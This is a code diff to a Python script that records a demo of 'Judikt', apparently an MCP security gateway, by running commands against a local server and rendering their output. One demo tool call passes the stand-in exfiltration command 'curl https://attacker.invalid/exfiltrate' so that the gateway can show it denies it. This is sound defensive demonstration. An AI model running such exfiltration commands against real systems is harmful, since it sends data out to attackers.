@@ -3,10 +3,15 @@ from __future__ import annotations
 
 import json
 import os
+import signal
+import socket
 import subprocess
 import sys
 import tempfile
 import textwrap
+import time
+import urllib.error
+import urllib.request
 from dataclasses import dataclass
 from pathlib import Path
 
@@ -23,7 +28,7 @@ ROOT = Path(__file__).resolve().parents[1]
 WIDTH = 1280
 HEIGHT = 720
 MAJOR_HOLD_MS = 5000
-EXPLAINER_HOLD_MS = 6000
+EXPLAINER_HOLD_MS = 5000
 TARGET_DURATION_MS = 150_000
 MAX_COLUMNS = 112
 MAX_ROWS = 23
@@ -65,6 +70,14 @@ COLORS = {
 class TerminalPage:
     title: str
     lines: tuple[str, ...]
+
+
+@dataclass(frozen=True)
+class CommandCapture:
+    chapter: str
+    command: str
+    output: str
+    exit_code: int | None
 
 
 @dataclass(frozen=True)
@@ -177,16 +190,21 @@ INFO_SLIDES = (
 )
 
 
-def capture_live_demo() -> tuple[str, str, int]:
-    """Execute the real demo command and return its terminal transcript."""
+def capture_live_demo() -> list[CommandCapture]:
+    """Execute feature-specific commands against a live remote MCP server."""
     with tempfile.TemporaryDirectory(prefix="judikt-terminal-recording-") as temp_name:
         temp = Path(temp_name)
-        policy_path = _recording_policy(temp)
+        _recording_policy(temp)
         upstream_path = _recording_upstream(temp)
-        audit_path = temp / "audit.db"
+        port = _free_port()
         environment = {
             **os.environ,
             "PYTHONPATH": str(ROOT / "src"),
+            "TMP": str(temp),
+            "PORT": str(port),
+            "JUDIKT_BASE_URL": f"http://127.0.0.1:{port}",
+            "JUDIKT_MCP_URL": f"http://127.0.0.1:{port}/mcp",
+            "JUDIKT_HTTP_BEARER_TOKEN": "demo-recording-bearer-token",
             "JUDIKT_APPROVAL_SECRET": "demo-recording-approval-secret",
             "JUDIKT_AUDIT_HMAC_SECRET": "demo-recording-independent-audit-secret",
             "JUDIKT_AUDIT_SIGNATURE_REQUIRED": "true",
@@ -196,36 +214,189 @@ def capture_live_demo() -> tuple[str, str, int]:
             "JUDIKT_UPSTREAM_CONFIG": str(upstream_path),
             "JUDIKT_TOOL_PIN_PATH": str(temp / "tool-pins.json"),
             "JUDIKT_FINDING_SINK": "none",
+            "JUDIKT_ALLOW_DIRECT_APPROVAL": "true",
+            "JUDIKT_KUBERNETES_MODE": "simulated",
             "GROQ_API_KEY": "",
         }
-        command = [
-            str(ROOT / "scripts" / "run_demo.sh"),
-            "--policy",
-            str(policy_path),
-            "--audit-db",
-            str(audit_path),
-        ]
-        completed = subprocess.run(
-            command,
+        server_command = (
+            './scripts/run_real_mcp_http.sh --policy "$TMP/policy.json" '
+            '--audit-db "$TMP/audit.db" --host 127.0.0.1 '
+            '--port "$PORT" --log-level warning'
+        )
+        server_log_path = temp / "server.log"
+        server_log = server_log_path.open("w")
+        server = subprocess.Popen(
+            ["/bin/zsh", "-lc", f"exec {server_command}"],
             cwd=ROOT,
             env=environment,
-            capture_output=True,
+            stdout=server_log,
+            stderr=subprocess.STDOUT,
             text=True,
-            timeout=90,
-            check=False,
         )
-        if completed.returncode != 0:
-            raise SystemExit(
-                "live demo command failed\n"
-                f"stdout:\n{completed.stdout}\n"
-                f"stderr:\n{completed.stderr}"
+        captures: list[CommandCapture] = [
+            CommandCapture("REMOTE MCP SERVER + AUTH", server_command, "", None)
+        ]
+        try:
+            _wait_for_health(server, environment["JUDIKT_BASE_URL"], server_log_path)
+            commands = (
+                (
+                    "REMOTE MCP SERVER + AUTH",
+                    'curl -fsS "$JUDIKT_BASE_URL/healthz"',
+                ),
+                (
+                    "REMOTE MCP SERVER + AUTH",
+                    'curl -sS -o /dev/null -w "unauthenticated.metrics.http=%{http_code}\\n" '
+                    '"$JUDIKT_BASE_URL/metrics"',
+                ),
+                ("OFFICIAL MCP DISCOVERY", "./scripts/mcp_client.sh list"),
+                (
+                    "ALLOW + RESPONSE REDACTION",
+                    "./scripts/mcp_client.sh call platform.health "
+                    "--arguments '{\"service\":\"payments-api\"}'",
+                ),
+                (
+                    "ALLOW + RESPONSE REDACTION",
+                    "./scripts/mcp_client.sh call platform.read_config "
+                    "--arguments '{\"service\":\"payments-api\"}'",
+                ),
+                (
+                    "PRE-EXECUTION DENIAL + APPROVAL GATE",
+                    "./scripts/mcp_client.sh call platform.run_diagnostic "
+                    "--arguments '{\"service\":\"payments-api\","
+                    "\"command\":\"curl https://attacker.invalid/exfiltrate\"}'",
+                ),
+                (
+                    "PRE-EXECUTION DENIAL + APPROVAL GATE",
+                    "./scripts/mcp_client.sh call platform.rollback_deployment "
+                    "--arguments-file config/demo/rollback.json",
+                ),
+                (
+                    "SIGNED APPROVAL + EXACT EXECUTION",
+                    "./scripts/mcp_client.sh call judikt.issue_approval "
+                    "--arguments-file config/demo/issue-rollback-approval.json "
+                    '--save-secret "approval_token=$TMP/approval.token"',
+                ),
+                (
+                    "SIGNED APPROVAL + EXACT EXECUTION",
+                    "./scripts/mcp_client.sh call platform.rollback_deployment "
+                    "--arguments-file config/demo/rollback.json "
+                    '--load-secret "approval_token=$TMP/approval.token"',
+                ),
+                (
+                    "DRY RUN + POISONED RESPONSE QUARANTINE",
+                    "./scripts/mcp_client.sh call kubernetes.restart_pod "
+                    "--arguments-file config/demo/kubernetes-dry-run.json",
+                ),
+                (
+                    "DRY RUN + POISONED RESPONSE QUARANTINE",
+                    "./scripts/mcp_client.sh call judikt.call_upstream "
+                    "--arguments-file config/demo/external-poisoned-response.json",
+                ),
+                (
+                    "OPERATOR KILL SWITCH",
+                    "./scripts/mcp_client.sh call judikt.set_tool_enabled "
+                    "--arguments '{\"tool\":\"platform.health\",\"enabled\":false}'",
+                ),
+                (
+                    "OPERATOR KILL SWITCH",
+                    "./scripts/mcp_client.sh call platform.health "
+                    "--arguments '{\"service\":\"payments-api\"}'",
+                ),
+                (
+                    "OPERATOR KILL SWITCH",
+                    "./scripts/mcp_client.sh call judikt.set_tool_enabled "
+                    "--arguments '{\"tool\":\"platform.health\",\"enabled\":true}'",
+                ),
+                (
+                    "SIGNED AUDIT + PIN + RUNTIME STATE",
+                    "./scripts/mcp_client.sh call judikt.runtime_state --arguments '{\"limit\":2}' "
+                    "--select audit_integrity.valid --select audit_integrity.checked_events "
+                    "--select audit_integrity.signed --select rate_limiter.mode "
+                    "--select tool_integrity.external-incidents.status --select finding_delivery",
+                ),
+                (
+                    "SIGNED AUDIT + PIN + RUNTIME STATE",
+                    'curl -fsS -H "Authorization: Bearer $JUDIKT_HTTP_BEARER_TOKEN" '
+                    '"$JUDIKT_BASE_URL/metrics" | grep \'^judikt_tool_calls_total\'',
+                ),
+                (
+                    "AIOPS INCIDENT CREATION",
+                    "./scripts/mcp_client.sh call incident.create "
+                    "--arguments-file config/demo/incident-create.json "
+                    '--save-secret "result.id=$TMP/incident.id"',
+                ),
+                (
+                    "CORRELATED INCIDENT EVIDENCE",
+                    "./scripts/mcp_client.sh call incident.attach_evidence "
+                    "--arguments-file config/demo/incident-evidence.json "
+                    '--load-secret "incident_id=$TMP/incident.id"',
+                ),
+                (
+                    "INCIDENT TIMELINE",
+                    "./scripts/mcp_client.sh call incident.timeline "
+                    "--arguments-file config/demo/incident-timeline.json "
+                    '--load-secret "incident_id=$TMP/incident.id"',
+                ),
+                (
+                    "LIVE RATE-LIMIT EXHAUSTION",
+                    "for i in {1..11}; do ./scripts/mcp_client.sh call platform.health "
+                    "--arguments '{\"service\":\"checkout-worker\"}'; done | "
+                    "grep '^response.verdict=' | sort | uniq -c",
+                ),
+                (
+                    "LIVE CIRCUIT-BREAKER OPENING",
+                    "for i in {1..3}; do ./scripts/mcp_client.sh call judikt.call_upstream "
+                    "--arguments-file config/demo/external-poisoned-response.json; done | "
+                    "grep '^response.verdict='",
+                ),
+                (
+                    "FAILURE DRILLS",
+                    "./scripts/run_failure_tests.sh | jq -r "
+                    "'\"failure_drill=\\(.passed) \\(.passed_count)/\\(.case_count)\", "
+                    "(.results[] | \"case=\\(.name) passed=\\(.passed)\")'",
+                ),
+                (
+                    "ADVERSARIAL + PERFORMANCE QUALIFICATION",
+                    "./scripts/run_attackbench.sh tests/fixtures/attackbench_smoke.jsonl "
+                    '"$TMP/attackbench.json" --expected-samples 8 --min-precision 1 '
+                    "--min-recall 1 --min-f1 1 | jq -c "
+                    "'{dataset:.benchmark.dataset_id,samples:.overall.samples,"
+                    "precision:.overall.precision,recall:.overall.recall,f1:.overall.f1,"
+                    "raw_payloads:.privacy.raw_payloads_in_report}'",
+                ),
+                (
+                    "ADVERSARIAL + PERFORMANCE QUALIFICATION",
+                    "./scripts/run_performance_benchmark.sh \"$TMP/performance.json\" "
+                    "--iterations 25 --warmup 5 --max-p99-ms 100 --min-throughput 10 | jq -c "
+                    "'{p99_ms:.guarded_latency_ms.p99,throughput:.throughput_calls_per_second,"
+                    "audit_chain_valid:.results.audit_chain_valid,audit_signed:.results.audit_signed}'",
+                ),
+                (
+                    "REMOTE MCP END-TO-END TEST",
+                    "./scripts/python.sh -m unittest "
+                    "tests.test_real_mcp_e2e.RealMCPStreamableHTTPEndToEndTest -q",
+                ),
+                (
+                    "JWT AUTHORIZATION END-TO-END TEST",
+                    "env -u JUDIKT_HTTP_BEARER_TOKEN ./scripts/python.sh -m unittest "
+                    "tests.test_real_mcp_e2e.RealMCPJWTAuthorizationEndToEndTest -q",
+                ),
             )
-        display_command = (
-            "./scripts/run_demo.sh --policy $TMP/policy.json "
-            "--audit-db $TMP/audit.db"
-        )
-        _verify_transcript(completed.stdout)
-        return display_command, completed.stdout, completed.returncode
+            captures.extend(
+                _capture_command(chapter, command, environment)
+                for chapter, command in commands
+            )
+        finally:
+            if server.poll() is None:
+                server.send_signal(signal.SIGINT)
+                try:
+                    server.wait(timeout=10)
+                except subprocess.TimeoutExpired:
+                    server.kill()
+                    server.wait(timeout=5)
+            server_log.close()
+        _verify_captures(captures)
+        return captures
 
 
 def _recording_policy(temp: Path) -> Path:
@@ -252,69 +423,132 @@ def _recording_upstream(temp: Path) -> Path:
     return destination
 
 
-def _verify_transcript(transcript: str) -> None:
+def _free_port() -> int:
+    with socket.socket() as listener:
+        listener.bind(("127.0.0.1", 0))
+        return int(listener.getsockname()[1])
+
+
+def _wait_for_health(server: subprocess.Popen[str], base_url: str, log_path: Path) -> None:
+    deadline = time.time() + 20
+    while time.time() < deadline:
+        if server.poll() is not None:
+            raise SystemExit(
+                f"real MCP server exited before health check:\n{log_path.read_text()}"
+            )
+        try:
+            with urllib.request.urlopen(f"{base_url}/healthz", timeout=1) as response:
+                if response.status == 200:
+                    return
+        except (OSError, urllib.error.URLError):
+            time.sleep(0.1)
+    raise SystemExit(f"real MCP server did not become healthy:\n{log_path.read_text()}")
+
+
+def _capture_command(
+    chapter: str,
+    command: str,
+    environment: dict[str, str],
+) -> CommandCapture:
+    completed = subprocess.run(
+        ["/bin/zsh", "-o", "pipefail", "-lc", command],
+        cwd=ROOT,
+        env=environment,
+        stdout=subprocess.PIPE,
+        stderr=subprocess.STDOUT,
+        text=True,
+        timeout=90,
+        check=False,
+    )
+    capture = CommandCapture(chapter, command, completed.stdout.rstrip(), completed.returncode)
+    if completed.returncode != 0:
+        raise SystemExit(
+            f"demo command failed with exit {completed.returncode}: {command}\n{completed.stdout}"
+        )
+    return capture
+
+
+def _verify_captures(captures: list[CommandCapture]) -> None:
+    transcript = "\n".join(
+        f"$ {capture.command}\n{capture.output}" for capture in captures
+    )
     required = (
-        "EXECUTED in MCP child process",
-        'result.api_key="[REDACTED]"',
+        "run_real_mcp_http.sh",
+        '"status":"ok"',
+        "unauthenticated.metrics.http=401",
+        "mcp.transport=streamable-http",
+        "response.verdict=allowed:true action:ALLOW",
+        '"api_key":"[REDACTED]"',
+        "response.verdict=allowed:false action:DENY",
         "REQUIRE_APPROVAL",
         "DRY_RUN_ONLY",
-        "QUARANTINE",
+        '"quarantined":true',
+        '"unsafe_text_exposed":false',
         "kill_switch",
-        "valid=true",
-        "checked_events=8",
-        "PASS: every demonstrated branch",
+        "response.audit_integrity.valid=true",
+        "response.audit_integrity.checked_events=8",
+        'response.tool_integrity.external-incidents.status="verified"',
+        "judikt_tool_calls_total",
+        "failure_drill=true 5/5",
+        "case=rate limit blocks excessive health checks passed=true",
+        "rule:rate_limit",
+        "rule:circuit_breaker",
+        '"samples":8',
+        '"audit_chain_valid":true',
+        "RealMCPStreamableHTTPEndToEndTest",
+        "RealMCPJWTAuthorizationEndToEndTest",
     )
     missing = [value for value in required if value not in transcript]
     if missing:
-        raise SystemExit(f"live demo transcript is missing required evidence: {missing}")
-
-
-def transcript_pages(command: str, transcript: str) -> list[TerminalPage]:
-    lines = transcript.rstrip().splitlines()
-    intro: list[str] = []
-    sections: list[tuple[str, list[str]]] = []
-    current_title = ""
-    current_lines: list[str] = []
-    for line in lines:
-        if line.startswith("## "):
-            if current_title:
-                sections.append((current_title, current_lines))
-            current_title = line[3:]
-            current_lines = [line]
-        elif current_title:
-            current_lines.append(line)
-        else:
-            intro.append(line)
-    if current_title:
-        sections.append((current_title, current_lines))
-
-    launch = [
-        f"gaurav@macbook-air Judikt % {command}",
-        "",
-        *intro,
-        "",
-        "[process] launching Judikt and isolated stdio MCP child servers...",
-        "[process] command is live; the following pages are captured stdout.",
+        raise SystemExit(f"live command captures are missing required evidence: {missing}")
+    pseudo_commands = [
+        line
+        for capture in captures
+        for line in capture.output.splitlines()
+        if line.startswith("$ ") or line.startswith("gaurav@")
     ]
-    pages = [TerminalPage("LIVE COMMAND", tuple(_wrap_lines(launch)))]
-    for title, section_lines in sections:
-        wrapped = _wrap_lines(section_lines)
-        chunks = [wrapped[index : index + MAX_ROWS] for index in range(0, len(wrapped), MAX_ROWS)]
+    if pseudo_commands:
+        raise SystemExit(f"command output contains pseudo shell prompts: {pseudo_commands}")
+
+
+def transcript_pages(captures: list[CommandCapture]) -> list[TerminalPage]:
+    chapters: list[tuple[str, list[list[str]]]] = []
+    for capture in captures:
+        lines: list[str] = [f"$ {capture.command}"]
+        if capture.output:
+            lines.extend(capture.output.splitlines())
+        if capture.exit_code is not None:
+            lines.append(f"[exit={capture.exit_code}]")
+        lines.append("")
+        wrapped = _wrap_lines(lines)
+        if chapters and chapters[-1][0] == capture.chapter:
+            chapters[-1][1].append(wrapped)
+        else:
+            chapters.append((capture.chapter, [wrapped]))
+
+    pages: list[TerminalPage] = []
+    for title, command_blocks in chapters:
+        chunks: list[list[str]] = []
+        current: list[str] = []
+        for block in command_blocks:
+            if len(block) > MAX_ROWS:
+                if current:
+                    chunks.append(current)
+                    current = []
+                chunks.extend(
+                    block[index : index + MAX_ROWS]
+                    for index in range(0, len(block), MAX_ROWS)
+                )
+                continue
+            if current and len(current) + len(block) > MAX_ROWS:
+                chunks.append(current)
+                current = []
+            current.extend(block)
+        if current:
+            chunks.append(current)
         for index, chunk in enumerate(chunks, start=1):
             suffix = f" ({index}/{len(chunks)})" if len(chunks) > 1 else ""
             pages.append(TerminalPage(f"{title}{suffix}", tuple(chunk)))
-    pages.append(
-        TerminalPage(
-            "PROCESS EXIT",
-            (
-                "[process] Judikt closed all MCP subprocesses cleanly.",
-                "[process] temporary policy, pins, SQLite audit, and fixture removed.",
-                "[process] exit status: 0",
-                "",
-                "gaurav@macbook-air Judikt %",
-            ),
-        )
-    )
     return pages
 
 
@@ -342,7 +576,6 @@ def _wrap_lines(lines: list[str]) -> list[str]:
 
 
 def render_recording(
-    command: str,
     pages: list[TerminalPage],
     output: Path,
     poster: Path,
@@ -357,29 +590,21 @@ def render_recording(
         frames.append(_info_slide(slide, index, len(INFO_SLIDES), fonts))
         durations.append(EXPLAINER_HOLD_MS)
     frames.append(_architecture_slide(fonts))
-    durations.append(7000)
+    durations.append(MAJOR_HOLD_MS)
     frames.append(_terminal_transition(fonts))
     durations.append(MAJOR_HOLD_MS)
 
-    prompt = "gaurav@macbook-air Judikt % "
-    for length in _typing_steps(len(command)):
-        typed = f"{prompt}{command[:length]}"
-        frames.append(_terminal_frame("LIVE COMMAND", [typed], fonts, 1, len(pages)))
-        durations.append(260)
-
     for page_number, page in enumerate(pages, start=1):
-        reveal_sizes = _reveal_steps(len(page.lines))
-        for visible in reveal_sizes:
-            frames.append(
-                _terminal_frame(
-                    page.title,
-                    list(page.lines[:visible]),
-                    fonts,
-                    page_number,
-                    len(pages),
-                )
+        frames.append(
+            _terminal_frame(
+                page.title,
+                list(page.lines),
+                fonts,
+                page_number,
+                len(pages),
             )
-            durations.append(420 if visible < len(page.lines) else MAJOR_HOLD_MS)
+        )
+        durations.append(MAJOR_HOLD_MS)
 
     remaining_ms = TARGET_DURATION_MS - sum(durations)
     if remaining_ms < MAJOR_HOLD_MS:
@@ -442,8 +667,8 @@ def _explainer_intro(fonts: dict[str, ImageFont.FreeTypeFont]) -> Image.Image:
     )
     draw.text(
         (106, 298),
-        "First understand the control plane. Then watch the real command,\n"
-        "processing path, MCP children, outputs, and signed evidence.",
+        "First understand the control plane. Then watch real commands drive the official\n"
+        "MCP server, protected operations, backend results, and signed evidence.",
         font=fonts["subtitle"],
         fill=COLORS["muted"],
         spacing=8,
@@ -589,8 +814,8 @@ def _terminal_transition(fonts: dict[str, ImageFont.FreeTypeFont]) -> Image.Imag
     draw.text((72, 180), "Now prove it in the terminal.", font=fonts["hero"], fill=COLORS["text"])
     draw.text(
         (74, 266),
-        "From this point forward, every command, input, processing step, backend path,\n"
-        "verdict, output, metric, and audit result comes from captured live stdout.",
+        "From this point forward, each green prompt is an exact repository command.\n"
+        "Every line below it is captured from that command's real output and exit status.",
         font=fonts["subtitle"],
         fill=COLORS["muted"],
         spacing=8,
@@ -602,17 +827,21 @@ def _terminal_transition(fonts: dict[str, ImageFont.FreeTypeFont]) -> Image.Imag
         outline=COLORS["border"],
         width=2,
     )
-    terminal_lines = (
-        "$ ./scripts/run_demo.sh --policy $TMP/policy.json --audit-db $TMP/audit.db",
-        "[process] launch Judikt + isolated stdio MCP child processes",
-        "[proof] inputs -> controls -> backend execution/skip -> output -> evidence",
+    proof_lines = (
+        ("COMMAND", "real shell input from this repository", "green"),
+        ("TRANSPORT", "official Streamable HTTP MCP client", "blue"),
+        ("PROCESS", "policy verdict plus backend result", "purple"),
+        ("EVIDENCE", "auth, audit, metrics, drills, benchmarks", "amber"),
     )
-    for index, line in enumerate(terminal_lines):
+    for index, (heading, detail, accent) in enumerate(proof_lines):
+        x = 104 + (index % 2) * 540
+        y = 414 + (index // 2) * 72
+        _pill(draw, (x, y), heading, fonts["tiny"], accent)
         draw.text(
-            (104, 422 + index * 48),
-            line,
-            font=fonts["mono"],
-            fill=COLORS["green"] if index == 0 else COLORS["text"],
+            (x + 128, y + 7),
+            detail,
+            font=fonts["body"],
+            fill=COLORS["text"],
         )
     return image
 
@@ -647,25 +876,11 @@ def _explainer_outro(fonts: dict[str, ImageFont.FreeTypeFont]) -> Image.Image:
     _center_text(
         draw,
         (96, 476, 1184, 542),
-        "Reproduce the complete media artifact:  make demo-recording",
-        fonts["mono"],
+        "REMOTE MCP | BOUNDED EXECUTION | QUARANTINED OUTPUT | VERIFIABLE EVIDENCE",
+        fonts["sans_small"],
         COLORS["text"],
     )
     return image
-
-
-def _typing_steps(length: int) -> list[int]:
-    if length <= 1:
-        return [length]
-    count = 9
-    return sorted({max(1, round(length * index / count)) for index in range(1, count + 1)})
-
-
-def _reveal_steps(length: int) -> list[int]:
-    if length <= 1:
-        return [length]
-    count = min(5, max(2, (length + 4) // 5))
-    return sorted({max(1, round(length * index / count)) for index in range(1, count + 1)})
 
 
 def _terminal_frame(
@@ -690,7 +905,13 @@ def _terminal_frame(
         y += LINE_HEIGHT
 
     draw.rectangle((18, HEIGHT - 48, WIDTH - 18, HEIGHT - 18), fill=TITLEBAR)
-    draw.text((40, HEIGHT - 34), "LIVE CAPTURED STDOUT", font=fonts["small"], fill=GREEN, anchor="lm")
+    draw.text(
+        (40, HEIGHT - 34),
+        "ACTUAL COMMAND + CAPTURED OUTPUT",
+        font=fonts["small"],
+        fill=GREEN,
+        anchor="lm",
+    )
     draw.text(
         (WIDTH - 40, HEIGHT - 34),
         f"page {page:02d}/{page_count:02d} | major output hold 5s",
@@ -707,7 +928,12 @@ def _line_color(line: str) -> str:
         return BLUE
     if line.startswith("$") or line.startswith("gaurav@"):
         return GREEN
-    if "quarantine" in lowered or "deny" in lowered or "allowed=false" in lowered:
+    if (
+        "quarantine" in lowered
+        or "deny" in lowered
+        or "allowed=false" in lowered
+        or "allowed:false" in lowered
+    ):
         return RED
     if "require_approval" in lowered or "dry_run" in lowered or "risk=critical" in lowered:
         return AMBER
@@ -844,17 +1070,20 @@ def _load_fonts() -> dict[str, ImageFont.FreeTypeFont]:
 
 
 def main() -> None:
-    command, transcript, return_code = capture_live_demo()
-    pages = transcript_pages(command, transcript)
+    captures = capture_live_demo()
+    pages = transcript_pages(captures)
     output = ROOT / "docs" / "assets" / "judikt-demo.gif"
     poster = ROOT / "docs" / "assets" / "judikt-demo-poster.png"
-    duration_ms = render_recording(command, pages, output, poster)
+    duration_ms = render_recording(pages, output, poster)
     print(
         json.dumps(
             {
-                "format": "hybrid explainer slides plus captured terminal stdout",
-                "terminal_source": "captured stdout from ./scripts/run_demo.sh",
-                "process_exit_code": return_code,
+                "format": "hybrid explainer plus actual remote MCP command captures",
+                "terminal_source": "feature-specific commands against a live Streamable HTTP MCP server",
+                "commands_captured": len(captures),
+                "successful_commands": sum(
+                    capture.exit_code == 0 for capture in captures if capture.exit_code is not None
+                ),
                 "explainer_slides": len(INFO_SLIDES) + 4,
                 "terminal_pages": len(pages),
                 "major_hold_ms": MAJOR_HOLD_MS,
